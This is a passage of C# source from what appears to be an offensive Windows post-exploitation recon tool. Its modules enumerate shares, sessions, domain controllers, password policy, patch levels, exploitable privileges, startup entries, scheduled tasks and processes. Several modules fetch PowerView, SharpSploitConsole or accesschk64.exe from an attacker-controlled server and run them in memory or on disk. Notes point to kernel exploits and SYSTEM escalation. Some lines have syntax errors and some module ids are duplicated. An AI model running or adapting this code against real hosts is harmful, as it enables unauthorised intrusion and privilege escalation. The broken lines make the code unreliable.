            title = "Get the list of all network shares for the local host via the 'powershell Get-PSDrive' command";
            command = @"Get-PSDrive | where {$_.Provider -like 'Microsoft.Powershell.Core\FileSystem'}";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_network_shares_wmic";
            title = "Get the list of all readable/writable local shares via the 'wmic' command";
            command = @"Get-WmiObject -class Win32_share -Filter ""type=0""";
            notes = "Use 'icacls <path>' to determine permissions";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,
                                           manualTask: notes);

            moduleId = "win_auto_recon_get_network_shares_wmic";
            title = "Get the list of all network shares for the local host via the 'wmic' command";
            command = "wmic logicaldisk get caption,description,providername";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_network_share_sessions_net";
            title = "Get the list of all network share sessions (users/hosts connected to the share) via the 'net' command";
            command = @"net session; " + 
                      @"net sessions";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_net_sessions_powerview_powershell";
            title = "Load Powerview in memory and get Network sessions via powerview powershell";
            serverPath = "/PowerSploit-master/Recon/PowerView.ps1";
            powershellCmd = "Get-NetSession";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title, serverIp, serverPort, serverPath,
    						   powershellCmd);


            moduleId = "win_auto_recon_get_current_domain_username_sharpsploitconsole_whoami";
            title = "Get the current username via SharpSploitConsole's whoami";
            binaryName = "SharpSploitConsole_" + Architecture + ".exe";
            serverPath = "/" + "SharpSploitConsole_" + Architecture + ".exe";
            parameters = "whoami";
            output += executeDotNetBinaryInMem(modulesToExec, modulesToNotExec, moduleId, title, serverIp, 
                                               serverPort, serverPath, binaryName, 
                                               parameters);

            moduleId = "win_auto_recon_get_integrity_level";
            command = "whoami /all | findstr /I Label";
            title = "Get the current integrity level. E.g. low integrity means no write-access to most folders. Except Internet Explorer provides write access to following folders to drop shells: %LocalAppData%\\Microsoft\\Windows\\Temporary Internet Files\\Low, %AppData%\\Microsoft\\Windows\\Cookies\\Low, %LocalAppData%\\Microsoft\\Windows\\History\\Low, %LocalAppData%\\Temp\\Low";
            refs = "Explanation of IE writable folders in Low Integrity mode @ http://www.thewindowsclub.com/temporary-internet-files-folder-location";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_hostname";
            command = "hostname";
            title = "Get hostname via 'hostname' command";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_domain_controllers_dsquery";
            command = "dsquery server";
            title = "Get Domain controllers via 'dsquery' command";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_domain_controllers_net";
            command = "net group \"Domain Controllers\" /domain";
            title = "Get Domain controllers in the domain via 'net' command";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);            

            moduleId = "win_auto_recon_get_authenticated_domain_controller_set";
            command = "set l";
            title = "Getting the authenticated domain controller via the env var through set cmd";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_hostname_nbtstat";
            notes = @"Get the hostname for this machine and other machines through the following command:
                        nbtstat -A <ip-address>";
            title = "Get hostname via 'nbtstat' command";
            output += printNotes(modulesToExec, modulesToNotExec, moduleId, title, notes);

            moduleId = "win_auto_recon_get_default_dns_servers_ipconfig";
            title = "Get the DNS servers via the 'ifconfig' command";
            command = "ipconfig /displaydns";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_default_dns_server_nslookup";
            title = "Get the DNS server for the device via nslookup";
            command = "nslookup whatever";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_dns_special_etc_hosts";
            title = "Get the DNS hostnames/domains with fixed IPs through the /etc/hosts file";
            command = "type %SYSTEMROOT%\\System32\\drivers\\etc\\hosts";
            notes = "Display DNS hosts entries - any special hosts?";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,
                                      manualTask: notes);

            moduleId = "win_auto_recon_get_dns_special_etc_networks";
            title = "Get any special DNS networks through the /etc/networks file";
            command = "type %SYSTEMROOT%\\System32\\drivers\\etc\\networks";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_network_config_dns_server_ip_addr_ipconfig";
            title = "Get the network config, DNS servers, IP addresses via 'ipconfig' command";
            command = "ipconfig /all";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_network_config_dns_server_ip_addr_wmic";
            title = "Get the network config, DNS servers, IP addresses via 'wmic' command";
            command = "wmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway," + 
                      "Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress " + 
                      "/format:list";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_available_interfaces_arp";
            title = "Get the available network interfaces via the 'arp' command";
            command = "arp -A";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_proxy_in_use_winhttp";
            title = "Get the proxy in-use via the 'winhttp' command";
            command = "net winhttp";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_open_network_connections_netstat";
            title = "Get the network connections via the netstat command";
            command = "netstat -ano";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_routing_table_route";
            title = "Get the network routing table via the route command";
            command = "route print";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);


            moduleId = "win_auto_recon_get_password_complexity_net";
            title = "Get the password policy/password complexity via 'net accounts' command for this device";
            command = "net accounts";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_password_complexity_domain_net";
            title = "Get the password policy/password complexity via 'net accounts /domain' command for this device";
            command = "net accounts /domain";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_systeminfo";
            command = "systeminfo";
            title = "Get systeminfo via 'systeminfo' command and evaluate the patch levels - missing patches?";
            notes = @"Determine windows versions looking at the Windows ID:
                NT 3.1 - Windows NT 3.1 (All)
                NT 3.5 - Windows NT 3.5 (All)
                NT 3.51 - Windows NT 3.51 (All)
                NT 4.0 - Windows NT 4.0 (All)
                NT 5.0 - Windows 2000 (All)
                NT 5.1 - Windows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)
                NT 5.2 - Windows XP (64-bit, Pro 64-bit), 
                         Windows Server 2003 & R2 (Standard,Enterprise), 
                         Windows Home Server
                NT 6.0 - Windows Vista (Starter, Home, Basic, Home Premium, Business, Enterprise, Ultimate)
                NT 6.1 - Windows Server 2008 (Foundation, Standard, Enterprise),
                         Windows 7 (Starter, Home, Pro, Enterprise, Ultimate)
                NT 6.2 - Windows Server 2008 R2 (Foundation, Standard, Enterprise),
                         Windows 8 (x86/64, Pro, Enterprise, Windows RT (ARM)), Windows Phone 8, Windows Server 2012 (Foundation, Essentials, Standard)

                Run 'win_kernel_exploits_checker.py' script to get the Kernel Exploits for Windows using the systeminfo output and 'wmic qfe' command output.

                Taken from: Red Team Field Manual, Page 15";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,
                                      manualTask: notes);

            moduleId = "win_auto_recon_osversion_powershell";
            title = "Determine the OS Version via powershell - any well-known exploits";
            command = "[System.Environment]::OSVersion.Version";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_info_about_users_get_wmiobject_powershell";
            title = "Determine the information about all user accounts via Get-WMIObject";
            command = "Get-WmiObject -Class Win32_UserAccount";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_systeminfo_ver";
            command = "ver";
            title = "Get systeminfo via 'ver' command";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_systeminfo_wmic";
            command = "wmic os get Caption, CSDVersion /value";
            title = "Get systeminfo via 'wmic' command";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_cpu_info_processor_info_wmic";
            command = "wmic cpu get deviceid, addresswidth, maxclockspeed, name, manufacturer, processorid";
            title = "get info about the cpu/processor via wmic";
            refs = "https://quux.wiki.zoho.com/WMIC-Snippets.html";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_video_card_info_wmic";
            title = "Get video card info via wmic";
            command = "wmic path Win32_VideoController get  caption, CurrentHorizontalResolution, CurrentVerticalResolution, Description, DriverVersion, AdapterRAM /format:list";
            refs = "https://quux.wiki.zoho.com/WMIC-Snippets.html";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_external_drivers_wmic";
            title = "Get the drivers via wmic command - any vulnerabilities?";
            command = "wmic sysdriver get Caption, Name, PathName, ServiceType, State, Status /format:list";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_external_drivers_driverquery";
            title = "Get the drivers via driverquery command";
            command = "driverquery";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_external_drivers_wmic";
            title = "Get the system drivers via 'wmic' command";
            command = "wmic sysdriver get Caption, Name, PathName, ServiceType, State, Status /format:list";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_hard_drive_info_wmic";
            command = "wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber";
            title = "get info about the Hard drive info via wmic";
            refs = "https://quux.wiki.zoho.com/WMIC-Snippets.html";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_motherboard_info_wmic";
            command = "wmic computersystem get domain, EnableDaylightSavingsTime, Manufacturer, Model, PartOfDomain, TotalPhysicalMemory, username";
            title = "get info about the Motherboard via wmic";
            notes = "# Taken from: https://quux.wiki.zoho.com/WMIC-Snippets.html";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_virtual_memory_info_wmic";
            command = @"wmic os get CurrentTimeZone, FreePhysicalMemory, FreeVirtualMemory, NumberofProcesses, NumberofUsers, Organization, Status /format:list; " +
                      @"wmic os get CurrentTimeZone, FreePhysicalMemory, FreeVirtualMemory, NumberofProcesses, NumberofUsers, LastBootUpdate, RegisteredUsers, Organization, Status /format:list; " +;
            title = "get info about the virtual memory in-use via wmic";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_privileges_whoami";
            title = "Get current user and permissions via 'whoami /privs' command";
            command = "whoami /priv";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);
            
            moduleId="win_auto_recon_privileged_access_tokens_whoami";
            title = @"Get privileges via 'whoami /priv' command that can get you SYSTEM access potentially";
            command = @"whoami /priv | findstr /I /C:""SeImpersonatePrivilege"" /C:""SeAssignPrimaryPrivilege"" /C:""SeAssignPrimaryPrivilege"" /C:""SeTcbPrivilege"" /C:""SeBackupPrivilege"" /C:""SeRestorePrivilege"" /C:""SeCreateTokenPrivilege"" /C:""SeLoadDriverPrivilege"" /C:""SeTakeOwnershipPrivilege"" /C:""SeDebugPrivilege""";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_whoami_all";
            command = "whoami /all";
            title = "Check 'whoami /all' for Integrity levels";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_is_user_admin_powershell";
            command = "([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)";
            title = "Is user an Administrator based on the powershell command via windows identity?";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_patchinfo_wmic";
            command = "wmic qfe";
            title = "Get all the patches information for any known exploits for the OS";
            notes = @"
                    Get more info including installation date via this command:
                        wmic qfe get Caption,Description,HotFixID,InstalledOn

                    To check if specfic patch installed:
                        wmic qfe where ""HotFixID like '%928366%'"" get Description, FixComments, InstalledOn, ServicePackInEffect";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,
                                      manualTask: notes);

            moduleId = "win_auto_recon_patchinfo_wmic_quickfixengineering";
            command = "Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid}";
            title = "Get all the security patches for an OS";
            notes = @"Any exploits?";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,
                                      manualTask: notes);
            

            moduleId = "win_auto_recon_patchinfo_powershell_get_hotfix_pswindowsupdate";
            title="Get a list of all the patches via Powershell's PSWindowsUpdate's Get-WindowsUpdate' command";
            command = "Get-WindowsUpdate; Get-WUList";
            notes = @"
                      Taken from: http://woshub.com/pswindowsupdate-module/
                      Requires 'PSWindowsUpdate' to be installed as described here: https://www.powershellgallery.com/packages/PSWindowsUpdate/2.1.1.2
                      ";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);

            moduleId = "win_auto_recon_patchinfo_powershell_get_hotfix";
            title="Get a list of all the patches via Powershell's 'Get-Hotfix' command";
            command = "Get-Hotfix";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_patchinfo_powershell_update_searcher";
            command = "(New-Object -ComObject microsoft.update.session).CreateUpdateSearcher().Search(\"IsHidden=0 and IsInstalled=0\").Updates | select Title,RebootRequired,CVEIds,IsMandatory";
            title="Get a list of all the patches via Microsoft's Updater through Powershell";
            notes = "Taken from: https://twitter.com/wincmdfu/status/1140668272821460995";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,   
                                           manualTask: notes);
               
            moduleId = "win_auto_recon_list_patchinfo_c_windows_dir";
            title = "Get a list of all installed patches in the Windows C:\\ directory";
            command = "dir /a /b C:\\Windows\\kb*";
            refs = "RTFM - Windows System Info Commands";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_installed_software_wmic";
            command = "wmic product get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version";
            title = "Get installed software list via wmic";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_installed_software_powershell_get_package";
            title="Get list of software installed via Powershell's Get-Package command for known exploits";
            command = "get-package";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_installed_software_dir";
            title = "Get installed software list via dir for knwon exploits";
            command = "dir C:\\\"Program Files\";" +
                      "dir C:\\\"Program Files (x86)\"";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_installed_software_reg";
            title = "Get a list of all software installed on PC via reg command for known exploits";
            regPath = @"HKEY_LOCAL_MACHINE\SOFTWARE";
            notes = "Search searchsploit/google for known exploits";
            output += checkRegPath(modulesToExec, modulesToNotExec, moduleId, title, regPath,
                                   manualTask: notes);

            moduleId = "win_auto_recon_version_ver";
            command = "ver";
            title = "Get the version of OS in use";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_machine_info_wmic";
            command = "wmic os get Caption, CSDVersion /value";
            title = "Get OS information via wmic";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_machine_type";
            command = "$(get-wmiObject -Class Win32_ComputerSystem).DomainRole";
            title = "Get information about the device type e.g. is it standalone workstation OR member server on domain";
            notes = @"Based on the returned response, the type of system is:
                           Standalone Workstation (0)
                           Member Workstation (1)
                           Standalone Server (2) 
                           Member Server (3)
                           Backup Domain Controller (4)
                           Primary Domain Controller (5)";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);

            moduleId = "win_auto_recon_processor_info_wmic";
            title = "Get processor info via wmic";
            command = "wmic cpu get deviceID, Addresswidth, MaxClockSpeed, Name, Manufacturer, ProcessorID";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_hard_drive_info_wmic";
            title = "Get hard drive info via wmic";
            command = "wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_volumes_info_wmic";
            title = "Get mapped hard drive volumes info via wmic";
            command = "wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_system_bios_info_wmic";
            title = "Get System BIOS info";
            command = @"wmic computersystem get domain, EnableDaylightSavingsTime, Manufacturer, Model, PartOfDomain, TotalPhysicalMemory, username; " + 
                      @"wmic bios get SerialNumber,BiosVersion; " + ;
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);
        
            moduleId = "win_auto_recon_video_cards_info_wmic";
            title = "Get Video Controllers/Cards info. See https://quux.wiki.zoho.com/WMIC-Snippets.html for more info";
            command = "wmic path Win32_VideoController get caption, CurrentHorizontalResolution, CurrentVerticalResolution, Description, DriverVersion, AdapterRAM /format:list";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);
 
            moduleId = "win_auto_recon_net_user_net";
            title = "Get a list about about all the users. Repeat the command with '/domain' and also each username!";
            command = "net user";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_list_drives_fsutil";
            title = "Get a list of all drives via fsutil";
            command = "fsutil fsinfo drives";
            notes = "Taken from: RTFM";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);
 
            moduleId = "win_auto_recon_list_drives_dir";
            title = "Get a list of all drives via dir command";
            command = "for %%i in (a b d e f g h i j k l m n o p q r s t u v w x y z) do @dir %%i: 2>nul";
            notes = "Taken from: RTFM";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);

            moduleId = "win_auto_recon_list_pdf_files_dir";
            title = "Get a list of all the PDF files via the 'dir' command";
            command = "dir /a /s /b c:\\*.pdf*";
            notes = "Taken from: RTFM - Windows System Info Commands";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);

            moduleId = "win_auto_recon_get_user_info_powershell_powerview";
            title = "Load Powerview in memory and get info about user via 'net user' and 'Get-NetUser'";
            serverPath = "/PowerSploit-master/Recon/PowerView.ps1";
            powershellCmd = "Get-NetUser";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title, serverIp, serverPort, serverPath,
    						   powershellCmd);

            moduleId = "win_auto_recon_net_user_all_powershell";
            title = "Get all the users and the powershell network";
            serverPath = "/PowerSploit-master/Recon/PowerView.ps1";
            powershellCmd = "Get-NetUser";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title, serverIp, serverPort, serverPath,
                                                   powershellCmd);

            moduleId = "win_auto_recon_net_current_user_details";
            title = "Get info about the user and the Group he/she is member of";
            command = "net user " + userName;
            manualTask = @"Any interesting groups to check out?
                           Is he already a member of Administrators group";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);            

            moduleId = "win_auto_recon_net_user_domain";
            title = "Get a list about about all the users on the net domain itself";
            command = "net user /domain";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);
 
            moduleId = "win_auto_recon_startup_locations_wmic";
            title = @"Get a list of all startup locations configured via wmic";
            command = @"wmic startup get Caption,Command,Location,User";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_startup_programs_alluserprofiles_dir";
            title = @"Get a list of all startup programs which may have known exploits, or allow 
                backdoors or run with privileged access";
            command = "dir %ALLUSERSPROFILE%\\\"Start Menu\"\\Programs\\Startup";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_startup_programs_userprofile_dir";
            title = @"Get a list of all startup programs which may have known exploits, or allow 
                backdoors or run with privileged access";
            command = "dir %USERSPROFILE%\\\"Start Menu\"\\Programs\\Startup";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_system_user_startup_locations_dir";
            title = @"Get a list of all system and other user startup locations";
            command = "dir %SystemDrive%\\ProgramData\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup;" +
                      "dir %SystemDrive%\\Users\\%UserName%\\AppData\\Roaming\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup;" + 
                      "dir %SystemDrive%\\\"Documents and Settings\"\\\"All Users\"\\\"Start Menu\"\\Programs\\Startup;" +
                      "dir %SystemDrive%\\wmiOWS\\\"Start Menu\"\\Programs\\Startup;" +
                      "dir %SystemDrive%\\WINNT\\Profiles\\\"All Users\"\\\"Start Menu\"\\Programs\\Startup;" + 
                      "dir %SystemDrive%\\Users\\\"All Users\"\\\"Start Menu\"\\Programs\\Startup;" + 
                      "dir %SystemDrive%\\Users\\%UserName%\\\"Start Menu\"\\Programs\\Startup;";
            notes = "Taken from: Red Team Field Manual - Windows Startup Directories";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, 
                                      manualTask: notes);

            moduleId = "win_auto_recon_system_user_startup_locations_reg";
            title = @"Get a list of all startup locations via 'reg'";
            command = @"reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run; " +
                      @"reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce; " +
                      @"reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run; " +
                      @"reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce";
            notes = "Taken from: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, 
                                      manualTask: notes);

            moduleId = "win_auto_recon_prefetch_dir";
            title = @"Get a list of all previously run files using the Prefetch folder";
            command = "dir %SYSTEMROOT%\\Prefetch";
            notes = @"To exploit .pf files and get metadata about the used files, review this article: 
                       https://www.hackers-arise.com/post/2016/11/02/digital-forensics-part-6-analyzing-windows-pre-fetch-files-for-evidence";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,
                                      manualTask: notes);

            moduleId = "win_auto_recon_firewall_state_config_netsh";
            title = @"Check if firewall is enabled and get the configuration via netsh";
            command = "netsh firewall show state; netsh firewall show config";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_firewall_show_advfirewall_profiles_netsh";
            title = "Show Firewall configuration profiles via 'netsh'";
            command = "netsh advfirewall show allprofiles";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_bitlocker_recovery_keys";
            title = "Files in the C: directory which could indicate bitlocker recovery keys being left around accidentally";
            command = "dir /b /s C:\\ | findstr /I /C:\"Bitlocker Recovery\"";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_list_program_files_dir";
            title = "Files in the C: directory and  'C:\\Program Files' directories. Check version of each software, and any known exploits?";
            command = "dir C:\\\"Program Files (x86)\";" +
                      "dir C:\\\"Program Files\"";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_accesschk_writable_directories";
            title = "Get the writable directories for 'Users' via accesschk64.exe binary";
            binaryName = "accesschk64.exe";
            serverPath = "/accesschk64.exe";
            parameters = "/accepteula -uwsq \"Users\" C:\\*";
            output += downloadExecuteBinary(modulesToExec, modulesToNotExec, moduleId, title, serverIp, 
    				               			serverPort, serverPath, binaryName, 
                                            parameters);
			
            moduleId = "win_auto_recon_accesschk_writable_directories";
            title = @"Get the writable directories for ""Authenticated Users"" via accesschk64.exe binary";
            command = @"accesschk64.exe /accepteula -uwsq ""Authenticated Users"" C:\\*";
            prefixCurrentDirectory = true;
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, prefixCurrentDirectory);
		
            moduleId = "win_auto_recon_all_services_wmic";
            title = "Get a list of all services via wmic";
            command = "wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName,State";
            notes = @"
                # Taken from: https://quux.wiki.zoho.com/WMIC-Snippets.html
            To get the running services, run the command:
                wmic service where (state=""running"") get caption, name, startmode, state";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, 
                                      manualTask: notes);
            
            moduleId = "win_auto_recon_all_scheduled_tasks_schtasks";
            title = "Get a list of ALL scheduled tasks via schtasks";
            command = "schtasks /query /fo LIST /v > out-scheduled-tasks.txt";
            notes = @"
                Just because schtasks.exe does not show anything doesn't mean a scheduled task may not run

                It is possible for a task to run under another user and in this case, it will not be visible in the schtasks.exe output";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);

            moduleId = "win_auto_recon_all_scheduled_tasks_dir";
            title = "Get a list of ALL scheduled tasks via the various directories from dir command";
            command = @"dir C:\Windows\Tasks; " + 
                      @"dir C:\Windows\System32\Tasks";
            notes = @"
                By default, Windows 10, Windows 2016 creates tasks within the C:\\Windows\\Tasks folder
                as described here: https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);

            moduleId = "win_auto_recon_all_scheduled_tasks_at";
            title = "Get a list of ALL scheduled tasks via at command";
            command = "at";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_all_running_processes_powershell_get_scheduledtask";
            title = "Get a list of ALL scheduled tasks via powershell's Get-ScheduledTask";
            command = @"Get-ScheduledTask | where {$_.TaskPath -notlike ""\Microsoft*""} | ft TaskName,TaskPath,State,Principal ";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_all_running_processes_tasklist";
            title = "Get a list of all running processes via tasklist";
            command = "tasklist /m; tasklist /v";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_all_running_processes_executables_wmic";
            title = "Get a list of all running executables within processes via 'wmic'";
            command = @"wmic PROCESS WHERE ""NOT ExecutablePath LIKE '%Windows%'"" GET ExecutablePath";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);
            
            moduleId = "win_auto_recon_get_net_process_powerview_powershell";
            title = "Load Powerview in memory and get processes running locally via powerview powershell";
            serverPath = "/PowerSploit-master/Recon/PowerView.ps1";
            powershellCmd = "Get-NetProcess";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title, serverIp, serverPort, serverPath,
    						   powershellCmd);

            moduleId = "win_auto_recon_all_loggedin_usernames_query_user";
            title = "Get a list of currently logged-in usernames via 'query user'";
            command = "query user";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_all_loggedin_usernames_qwinsta";
            title = "Get a list of currently logged-in usernames via qwinsta";
            command = "qwinsta";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);   

            moduleId = "win_auto_recon_get_user_event_windows_logon_times_powerview_powershell";
            title = "Load Powerview in memory and get user login time via powerview powershell";
            serverPath = "/PowerSploit-master/Recon/PowerView.ps1";
            powershellCmd = "Get-UserEvent";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title, serverIp, serverPort, serverPath,
    						   powershellCmd);

            moduleId = "win_auto_recon_all_running_processes_query_process";
            title = "Get a list of all running processes via query";
            command = "query process";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_all_running_processes_wmic";
            title = "Get a list of all running processes via wmic";
            command = "WMIC PROCESS get Caption,Commandline,Processid";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);            

            moduleId = "win_auto_recon_all_running_processes_powershell_wmiobject";
            title = "Get a list of all running processes via powershell's Wmi-Object";
            command = @"Get-WmiObject -Query 'Select * from Win32_Process' | where {$_.Name -notlike 'svchost*'} | Select Name, Handle, @{Label=""Owner"";Expression={$_.GetOwner().User}} | ft -AutoSize";
            notes = "Also, displays the process owner IF we have admin perms - otherwise, BLANK can be SYSTEM, Network Service OR Local Service";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: notes);

            moduleId = "win_auto_recon_all_running_processes_powershell_gwmi";
            title = "Get a list of all running processes via powershell's Get-process Object with list of owners";
            command = @"$owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; get-process | select processname,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}}";
            notes = @"
                Taken from: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134/T1134.md

                Also, displays the process owner IF we have admin perms - otherwise, BLANK can be SYSTEM, Network Service OR Local Service";
